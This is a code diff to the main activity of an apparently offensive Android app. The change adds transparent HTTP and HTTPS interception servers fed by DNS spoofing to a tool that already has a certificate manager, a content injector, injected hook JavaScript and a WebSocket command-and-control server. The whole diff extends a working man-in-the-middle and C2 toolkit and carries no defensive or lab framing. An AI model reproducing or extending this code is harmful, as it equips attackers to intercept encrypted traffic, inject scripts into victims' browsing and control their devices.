@@ -33,6 +33,8 @@ class MainActivity : ComponentActivity() {
     private var c2Server: WebSocketC2Server? = null
     private var mediaServer: MediaServer? = null
     private var dnsCapture: DnsCapture? = null
+    private var transparentHttp: TransparentHttpServer? = null
+    private var transparentHttps: TransparentHttpsServer? = null
     private var hookJs: String = ""
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -65,6 +67,7 @@ class MainActivity : ComponentActivity() {
                             if (contentInjector == null) contentInjector = ContentInjector()
                             contentInjector?.config = config
 
+                            // explicit proxy (manual config on target)
                             proxy = InterceptProxy(8080, certManager!!, contentInjector!!).also { p ->
                                 p.mode = mode; p.start()
                                 launch {
@@ -74,12 +77,24 @@ class MainActivity : ComponentActivity() {
                                     }
                                 }
                             }
+
+                            // transparent servers (DNS-spoofed traffic lands here)
+                            transparentHttp = TransparentHttpServer(80, proxy!!, contentInjector!!).also { it.start() }
+                            transparentHttps = TransparentHttpsServer(443, proxy!!, certManager!!, contentInjector!!).also { it.start() }
+
                             mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
                             c2Server = WebSocketC2Server(9091, deviceManager!!).also { c2 ->
                                 c2.start()
                                 launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
                             }
-                            dnsCapture = DnsCapture(5353).also { it.start() }
+
+                            // DNS with transparent redirect enabled
+                            dnsCapture = DnsCapture(
+                                listenPort = 5353,
+                                gatewayIp = "192.168.43.1",
+                                transparentMode = true
+                            ).also { it.start() }
+
                             launch {
                                 while (true) {
                                     kotlinx.coroutines.delay(500)
@@ -89,14 +104,18 @@ class MainActivity : ComponentActivity() {
                                     }
                                 }
                             }
-                            Log.i("CG2", "All engines started")
+                            Log.i("CG2", "All engines started (transparent mode)")
                         } catch (e: Exception) {
                             Log.e("CG2", "Engine start failed", e)
                             isRunning = false
                         }
                     } else {
-                        proxy?.stop(); proxy = null; c2Server?.stop(); c2Server = null
-                        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
+                        proxy?.stop(); proxy = null
+                        transparentHttp?.stop(); transparentHttp = null
+                        transparentHttps?.stop(); transparentHttps = null
+                        c2Server?.stop(); c2Server = null
+                        mediaServer?.stop(); mediaServer = null
+                        dnsCapture?.stop(); dnsCapture = null
                     }
                 }
 
@@ -162,6 +181,8 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onDestroy() {
-        proxy?.stop(); c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop(); super.onDestroy()
+        proxy?.stop(); transparentHttp?.stop(); transparentHttps?.stop()
+        c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop()
+        super.onDestroy()
     }
 }
